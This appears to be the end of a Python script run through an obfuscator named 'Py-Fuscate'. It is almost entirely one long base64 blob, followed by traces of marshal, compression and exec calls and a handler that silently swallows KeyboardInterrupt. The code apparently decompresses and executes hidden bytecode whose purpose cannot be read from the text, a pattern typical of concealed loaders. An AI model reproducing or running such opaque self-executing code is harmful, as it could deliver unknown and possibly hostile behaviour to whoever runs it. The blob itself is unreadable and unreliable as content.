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\n')))
except KeyboardInterrupt:
	pass